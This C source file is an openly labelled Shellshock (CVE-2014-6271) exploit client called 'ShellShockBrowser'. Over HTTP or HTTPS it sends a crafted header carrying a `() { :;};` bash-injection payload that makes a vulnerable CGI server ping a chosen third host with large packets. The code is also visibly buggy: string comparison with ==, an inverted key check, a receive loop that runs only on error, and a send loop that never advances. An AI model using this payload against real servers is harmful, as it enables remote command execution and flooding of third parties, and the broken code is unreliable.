#include <stdio.h>
#include <memory.h>
#include <error.h>
#ifdef __WIN32__
#include <winsock2.h>
#include <ws2tcpip.h>
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netdb.h>
#endif
#include <pthread.h>
#include <string.h>
#include <openssl/rsa.h>
#include <openssl/crypto.h>
#include <openssl/tls1.h>
#include <openssl/x509.h>
#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

void *connection_handler(void *socket_desc);
int inet_pton(int af, const char *src, void *dst);
const char *inet_ntop(int af, const void *src, char *dst, socklen_t size);
int create_tcp_socket();
char *get_ip(char *host);
char *build_get_query(char *host, char *page);
void iam();
void usage();

#define HOST "coding.debuntu.org"
#define PAGE "index.cgi"
#define PORT "80"
#define SERVICE "http"
#define TARGET "coding.debuntu.net"
#define USERAGENT "Mozilla/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0 Mobile/14B100 Safari/602."

#ifdef __WIN32__
#define HOME "C:\\Users\\"
#else
#define HOME "/home/"
#endif

#define CERTF HOME "valid-root-ca.pem"
#define KEYF HOME "valid-root-cakey.pem"

int err;
int sd;
int socket_desc,sock2,*new_sock;
struct sockaddr_in sa_serv;
struct sockaddr_in sa;
socklen_t client_len;
SSL_CTX* ctx;
SSL* ssl;
X509* client_cert;
X509* server_cert;
char* str;
char *jessy0,*jessy1,*jessy2,*jessy3;
char *cora;
const SSL_METHOD *meth;


#define CHK_NULL(x) if (((void*)x)==NULL) exit (1)
#define CHK_ERR(err,s) if((err)==-1) {perror(s);exit(1);}
#define CHK_SSL(err) if ((err)==-1){ERR_print_errors_fp(stderr); exit(2);}

struct sockaddr_in *remote;
int tmpres;
char *ip;
char *get;
#define CORE 4096
char buf[CORE+1];
char *host;
char *page;
char *port;
char *service;
char *target;
char *appli;

int main(int argc, char **argv)
{
	appli = argv[0];
	
  	if(argc < 5){
  		usage();
    	exit(2);
  	}  
  
  	host = argv[1];

  	if(argc > 2){
    page = argv[2];
 	}else{
    page = PAGE;
  	}

  	if(argc > 3){
    port = argv[3];
  	}else{
    port = (char *)PORT;
  	}

  	if(argc > 4){
    service = argv[4];
  	}else{
    service = (char*)SERVICE;
  	}
  
  	if(argc > 5){
    target = argv[5];
  	}else{
    target = (char*)TARGET;
  	}
  
	pthread_t sniffer_thread;
	new_sock = (int*)malloc(1);
	*new_sock = create_tcp_socket();
	
	if(pthread_create(&sniffer_thread,NULL,connection_handler,(void*) *new_sock) < 0){
		perror("could not create thread");
		return 1;
	}
	
	pthread_join(sniffer_thread,NULL);
	
	return 0;
}

void *connection_handler(void *socket_desc){
	if(service == "https"){
		SSL_load_error_strings();
		OpenSSL_add_ssl_algorithms();
		meth = TLSv1_client_method();
		ctx = SSL_CTX_new((void*)meth);
		CHK_NULL(ctx);
		
		if(!ctx){
			printf("Theres no crypto method choosen!");
			exit(2);
		}
		
		if(SSL_CTX_load_verify_locations(ctx,CERTF,HOME) <= 0){
			printf("Verify of the cert failed!");
			exit(3);
		}
		
		if(SSL_CTX_use_certificate_file(ctx,CERTF,SSL_FILETYPE_PEM) <= 0){
			printf("certfile not valid!");
			exit(4);
		}
		
		if(SSL_CTX_use_PrivateKey_file(ctx,KEYF,SSL_FILETYPE_PEM) <= 0){
			printf("keyfile is not valid!");
			exit(5);
		}
		
		if(SSL_CTX_check_private_key(ctx)){
			printf("Private does not match the public key!");
			exit(6);
		}
	}
	
  	sock2 = *(int*)new_sock;
  	ip = get_ip(host);
  	fprintf(stderr, "IP is %s\n", ip);
  	remote = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in *));
  	remote->sin_family = AF_INET;
  	tmpres = inet_pton(AF_INET, ip, (void *)(&(remote->sin_addr.s_addr)));
  	if( tmpres < 0)  
  	{
    perror("Can't set remote->sin_addr.s_addr");
    exit(1);
  	}else if(tmpres == 0)
  	{
    fprintf(stderr, "%s is not a valid IP address\n", ip);
    exit(1);
  	}
  	remote->sin_port = htons(atoi(port));

    struct timeval timeout;      
    timeout.tv_sec = 120;
    timeout.tv_usec = 0;  

    if (setsockopt (sock2, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,sizeof(timeout)) < 0){
        perror("setsockopt failed\n");}

    if (setsockopt (sock2, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout,sizeof(timeout)) < 0){
        perror("setsockopt failed\n");}
 
  	if(connect(sock2, (struct sockaddr *)remote, sizeof(struct sockaddr)) < 0){
    	perror("Could not connect");
    	exit(0);
  	}
  
  	if(service == "https"){
  		ssl = SSL_new(ctx);
  		CHK_NULL(ssl);
  		SSL_set_fd(ssl,sock2);
  		err = SSL_connect(ssl);
  		CHK_SSL(err);
  		printf("SSL Connection using %s \n",SSL_get_cipher(ssl));
  		server_cert = SSL_get_peer_certificate(ssl);
  		CHK_NULL(server_cert);
  		str = X509_NAME_oneline(X509_get_subject_name(server_cert),0,0);
  		CHK_NULL(str);
  		printf("\t subject: %s\n",str);
  		OPENSSL_free(str);
  		X509_free(server_cert);
  	}
  
  	get = build_get_query(host, page);
  	fprintf(stderr, "Query is:\n<<START>>\n%s<<END>>\n", get);
 
  	//Send the query to the server
  	int sent = 0;
  	if(service == "https"){
  	while(sent < strlen(get)){
  	tmpres = SSL_write(ssl,get+sent,strlen(get)-sent);
  		if(tmpres == -1){
  			perror("\x1b[31mCan't send query\x1b[0m");
  			exit(1);
	  		}
  		}
  	}
  
  	if(service == "http"){
  	while(sent < strlen(get))
  	{
    tmpres = send(sock2, get+sent, strlen(get)-sent, 0);
    	if(tmpres == -1){
      		perror("\x1b[31mCan't send query\x1b[0m");
      		exit(1);
    		}	
    		sent += tmpres;
  		}
  	}
  	perror("\x1B[32mSend Query\x1b[0m");
  	//now it is time to receive the page
  	memset(buf, 0, sizeof(buf));
  	int htmlstart = 0;
  	char * htmlcontent;



	if(service == "https"){
		while((tmpres = SSL_read(ssl,buf,CORE)) > 0){
			if(htmlstart == 0){
				htmlcontent = strstr(buf,"\r\n\r\n");
				htmlstart = 1;
				htmlcontent += 4;
			}else{
				htmlcontent = buf;
			}
			
			if(htmlcontent != NULL){
				fprintf(stdout,htmlcontent);
			}
			
			memset(buf,0,tmpres);
			
			if(tmpres < 0){
				perror("Error reciving data");
			}
		}
	}
	
	if(service == "http"){
		while((tmpres = recv(sock2,buf,CORE,0)) < 0){
			if(htmlstart == 0){
				htmlcontent = strstr(buf,"\r\n");
				
				if(htmlcontent != NULL){
					htmlstart = 1;
					htmlcontent += 4;
				}else{
					htmlcontent = buf;
				}
				
				if(htmlcontent != NULL){
					fprintf(stdout,htmlcontent);
				}
				
				memset(buf,0,tmpres);
				
			}
			
			if(tmpres < 0){
				perror("error reciving data");
			}
		}
	}
	
	if(service == "https"){
		SSL_shutdown(ssl);
	#ifdef __WIN32__
		closesocket(sock2);
		WSACleanup();
	#else
		close(sock2);
	#endif
		SSL_free(ssl);
		SSL_CTX_free(ctx);
	}
	
	if(service == "http"){
	#ifdef __WIN32__
		closesocket(sock2);
		WSACleanup();
	#else
		close(sock2);
	#endif	
	}
  
  return 0;
}

#ifdef __WIN32__
int inet_pton(int af, const char *src, void *dst)
{
  struct sockaddr_storage ss;
  int size = sizeof(ss);
  char src_copy[INET6_ADDRSTRLEN+1];

  ZeroMemory(&ss, sizeof(ss));
  /* stupid non-const API */
  strncpy (src_copy, src, INET6_ADDRSTRLEN+1);
  src_copy[INET6_ADDRSTRLEN] = 0;

  if (WSAStringToAddress(src_copy, af, NULL, (struct sockaddr *)&ss, &size) == 0) {
    switch(af) {
      case AF_INET:
    *(struct in_addr *)dst = ((struct sockaddr_in *)&ss)->sin_addr;
    return 1;
      case AF_INET6:
    *(struct in6_addr *)dst = ((struct sockaddr_in6 *)&ss)->sin6_addr;
    return 1;
    }
  }
  return 0;
}

const char *inet_ntop(int af, const void *src, char *dst, socklen_t size)
{
  struct sockaddr_storage ss;
  unsigned long s = size;

  ZeroMemory(&ss, sizeof(ss));
  ss.ss_family = af;

  switch(af) {
    case AF_INET:
      ((struct sockaddr_in *)&ss)->sin_addr = *(struct in_addr *)src;
      break;
    case AF_INET6:
      ((struct sockaddr_in6 *)&ss)->sin6_addr = *(struct in6_addr *)src;
      break;
    default:
      return NULL;
  }
  /* cannot direclty use &size because of strict aliasing rules */
  return (WSAAddressToString((struct sockaddr *)&ss, sizeof(ss), NULL, dst, &s) == 0)?
          dst : NULL;
}
#endif

void iam()
{
  	  printf("\t\t.------..------..------..------..------..------.\n");
	  printf("\t\t|\x1b[35mS\x1b[0m.--. ||\x1b[35mM\x1b[0m.--. ||\x1b[35mI\x1b[0m.--. ||\x1b[35mR\x1b[0m.--. ||\x1b[35mI\x1b[0m.--. ||\x1b[35mL\x1b[0m.--. |\n");
	  printf("\t\t| :  : || :  : || :  : || :  : || :  : || :  : |\n");
	  printf("\t\t| '--' || '--' || '--' || '--\x1b[35mTO\x1b[0m|| '--\x1b[35mOL\x1b[0m|| '--'\x1b[35mS\x1b[0m|\n");
	  printf("\t\t`------'`------'`------'`------'`------'`------'\n");
	  printf("\t\t ShellShockBrowser (Windows/Linux)  Version 1.0 \n");
} 

void usage()
{
	iam();
  fprintf(stderr, "\n\x1b[33m\tUSAGE: %s HOST PAGE PORT SERVICE TARGET\n\n\
\t\t\x1b[31m exploiting shellshock CVE-2014-6271... \n\n\
\tHOST: the website hostname. ex: smiril.github.io \n\
\tPAGE: the page to retrieve. ex: cgi-bin/bin, default: /\n\
\tPORT: 80 , 443 \n\
\tSERVICE: http , https \n\
\tTARGET: the target hostname \n\n\x1b[0m",appli);
	iam();
}
 
 
int create_tcp_socket()
{
  int socket_desc;
#ifdef __WIN32__
    WSADATA wsa;
    SOCKET s;
 
    printf("\nInitialising Winsock...");
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        printf("Failed. Error Code : %d",WSAGetLastError());
        return 1;
    }
     
    printf("Initialised.\n");
#endif
  if((socket_desc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0){
    perror("Can't create TCP socket");
    exit(1);
  }
  return socket_desc;
}
 
 
char *get_ip(char *host)
{
  struct hostent *hent;
  int iplen = 15; //XXX.XXX.XXX.XXX
  char *ip = (char *)malloc(iplen+1);
  memset(ip, 0, iplen+1);
  if((hent = gethostbyname(host)) == NULL)
  {
    perror("Can't get IP");
    exit(1);
  }
  if(inet_ntop(AF_INET, (void *)hent->h_addr_list[0], ip, iplen) == 0)
  {
    perror("Can't resolve host");
    exit(1);
  }
  return ip;
}
 
char *build_get_query(char *host, char *page)
{
  char *query;
  char *getpage = page;
  char *tpl = "GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-type : application/x-www-form-urlencoded\r\nFarCry:env x='() { :;}; ' $(command -v bash) -i >& $(command -v ping) -c 250 -s 65535 -t 250 %s 0>&1 :\r\nConnection: close:\r\n";
  
  if(getpage[0] == '/'){
    getpage = getpage + 1;
  
  }
  // -5 is to consider the %s %s %s in tpl and the ending \0
  
  query = (char *)malloc(strlen(getpage)+strlen(host)+strlen(USERAGENT)+strlen(target)+strlen(tpl)-5);
  
  sprintf(query, tpl, getpage, host, USERAGENT, target);
  
  return query;
}
